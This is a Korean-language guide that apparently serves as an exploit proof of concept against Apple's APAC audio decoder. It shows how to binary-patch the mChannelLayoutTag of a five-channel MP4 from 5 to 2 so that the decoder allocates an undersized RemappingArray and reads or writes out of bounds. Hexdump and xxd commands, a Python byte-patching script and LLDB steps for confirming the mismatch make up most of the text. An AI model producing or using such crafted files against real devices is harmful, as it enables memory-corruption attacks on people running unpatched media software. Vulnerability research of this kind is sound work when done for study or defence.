
# APAC MP4 바이너리 패치 가이드: mChannelLayoutTag 조작으로 OOB 유도

---

## 🎯 목적

생성된 `.mp4` 파일은 5채널 오디오를 포함하고 있지만, `mChannelLayoutTag`는 2채널로 설정된 것처럼 보이도록 **바이너리 수정**하여 **RemappingArray 크기와 실제 데이터 간 불일치**를 유도합니다.

---

## 🧬 mChannelLayoutTag란?

- Apple의 채널 레이아웃 식별 값 (`UInt32`)
- 하위 2바이트(`0x0002`)가 **RemappingArray의 크기**로 사용됨
- 예: `0x00000002` → 2채널로 판단하고 RemappingArray 크기를 2로 설정

---

## 🧨 취약 조건 구성 요약

| 항목                    | 원래값 | 패치값 |
|-------------------------|--------|--------|
| 실제 채널 수            | 5      | 5      |
| `mChannelLayoutTag`     | 0x00000005 | **0x00000002** |

→ 이 경우, 디코더는 2채널만 RemappingArray로 할당하고,  
5개의 프레임 데이터를 리맵하려 할 때 OOB 발생

---

## 🛠️ 패치 절차

### 1. `hexdump` 등으로 `.mp4`를 바이너리로 확인

```bash
hexdump -C output_apac.mp4 | less
```

찾을 키워드 예시:
- `"chan"` (channel layout atom)
- `0x00000005` (5채널 태그) → 이걸 `0x00000002`로 수정

### 2. `xxd` + `sed`로 직접 바이트 수정

```bash
xxd output_apac.mp4 > hex.txt
# 편집: hex.txt에서 "00000005" → "00000002"
vim hex.txt
xxd -r hex.txt output_apac_patch.mp4
```

또는 `Python`으로도 가능:

```python
with open("output_apac.mp4", "rb") as f:
    data = bytearray(f.read())

old_tag = b"\x00\x00\x00\x05"
new_tag = b"\x00\x00\x00\x02"

index = data.find(old_tag)
if index != -1:
    data[index:index+4] = new_tag

with open("output_apac_patch.mp4", "wb") as f:
    f.write(data)
```

---

## ✅ 검증

```bash
ffmpeg -i output_apac_patch.mp4
```

또는 LLDB에서:

```lldb
breakpoint set --name DecodeAPACFrame
run output_apac_patch.mp4
check-mismatch
```

---

## ⚠️ 주의

- `chan` atom은 `.mp4`에서 내부적으로 압축되거나 숨겨질 수 있으므로 반드시 raw 패턴 매칭으로 수정
- 반드시 `.m4a`나 `.mp4`로 인코딩한 후 patch 시도

---

